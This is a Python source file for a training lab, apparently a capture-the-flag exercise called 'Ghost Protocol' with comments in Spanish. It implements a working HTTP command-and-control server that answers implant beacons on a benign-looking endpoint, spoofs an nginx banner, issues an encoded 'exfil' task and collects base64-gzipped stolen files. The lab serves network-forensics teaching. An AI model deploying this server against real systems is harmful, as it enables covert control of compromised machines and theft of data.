#!/usr/bin/env python3
"""
Servidor C2 HTTP del laboratorio "Ghost Protocol".

Emula un Team Server tipo malleable-C2 sobre HTTP en claro: el implante hace
check-ins periódicos (beaconing) a un endpoint de aspecto benigno, el C2 le
entrega tareas codificadas y el implante devuelve los resultados comprimidos y
codificados. Todo va por HTTP (puerto 80) para que UNA captura contenga la
conversación completa; el reto es reconocer el patrón de beacon entre el ruido
y decodificar las capas (base64 -> gzip) para recuperar lo exfiltrado.

  GET  /api/v2/status   -> check-in del implante. El C2 responde con JSON
                            {"task": "<base64>"}. Normalmente la tarea es 'idle';
                            en el beacon nº TASK_ON entrega la tarea real de exfil.
  POST /api/v2/submit   -> el implante sube base64(gzip(fichero_robado)).
  GET  /, /assets/*, /favicon.ico, /health -> ruido/benigno.

MITRE ATT&CK: T1071.001 (Web C2), T1132.001 (Data Encoding), T1041 (Exfil over C2).

NOTA DE MANTENEDOR: el fichero robado (con la flag) se lee de /seed/. En el
repo es un DECOY; el dataset real se inyecta en CI desde un secret. Por defecto
el C2 NO reconstruye el fichero (esa es la tarea del alumno); con
INSTRUCTOR_MODE=1 lo vuelca en /pcaps para comprobación.
"""
import base64
import gzip
import json
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("C2_PORT", "80"))
C2_DOMAIN = os.environ.get("C2_DOMAIN", "cdn-edge-sync.net")
TASK_ON = int(os.environ.get("TASK_ON", "6"))          # beacon nº que recibe la tarea real
SECRET_FILE = os.environ.get("SECRET_FILE", "/seed/northwind_customers.csv")
INSTRUCTOR = os.environ.get("INSTRUCTOR_MODE", "0") == "1"
OUT_DIR = os.environ.get("OUT_DIR", "/pcaps")
SERVER_BANNER = "nginx"

TASK_IDLE = "idle"
TASK_EXFIL = f"exfil {SECRET_FILE}"

BENIGN_BODY = "<!doctype html><html><body><h1>CDN Edge</h1><p>OK</p></body></html>"


def log(msg):
    print(msg, flush=True)


def b64(s):
    return base64.b64encode(s.encode() if isinstance(s, str) else s).decode()


class C2Handler(BaseHTTPRequestHandler):
    server_version = SERVER_BANNER
    protocol_version = "HTTP/1.1"
    beacons = 0  # contador de check-ins (estado de clase; una sola sesión en el lab)

    def log_message(self, fmt, *args):
        log(f"[c2] {self.address_string()} {fmt % args}")

    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Server", SERVER_BANNER)
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/api/v2/status":
            C2Handler.beacons += 1
            n = C2Handler.beacons
            task = TASK_EXFIL if n == TASK_ON else TASK_IDLE
            if n == TASK_ON:
                log(f"[c2] beacon #{n}: entregando tarea de exfil -> {SECRET_FILE}")
            self._send(200, json.dumps({"task": b64(task)}), ctype="application/json")
        elif path == "/health":
            self._send(200, "ok", ctype="text/plain")
        elif path in ("/", "/index.html", "/assets/app.js", "/assets/app.css", "/favicon.ico"):
            self._send(200, BENIGN_BODY)
        else:
            self._send(404, "Not Found", ctype="text/plain")

    def do_POST(self):
        if self.path.split("?", 1)[0] != "/api/v2/submit":
            self._send(404, "Not Found", ctype="text/plain")
            return
        length = int(self.headers.get("Content-Length", "0") or "0")
        raw = self.rfile.read(length)
        log(f"[c2] resultados recibidos: {len(raw)} bytes (base64+gzip)")
        if INSTRUCTOR:
            try:
                data = gzip.decompress(base64.b64decode(raw))
                os.makedirs(OUT_DIR, exist_ok=True)
                out = os.path.join(OUT_DIR, "RECOVERED_" + os.path.basename(SECRET_FILE))
                with open(out, "wb") as fh:
                    fh.write(data)
                log(f"[c2][instructor] fichero reconstruido: {out} ({len(data)} bytes)")
            except Exception as e:
                log(f"[c2][instructor] error al reconstruir: {e}")
        self._send(200, json.dumps({"ok": True}), ctype="application/json")


def main():
    log(f"[c2] Team Server HTTP en 0.0.0.0:{PORT} | domain={C2_DOMAIN} | task_on=beacon#{TASK_ON}")
    ThreadingHTTPServer(("0.0.0.0", PORT), C2Handler).serve_forever()


if __name__ == "__main__":
    main()
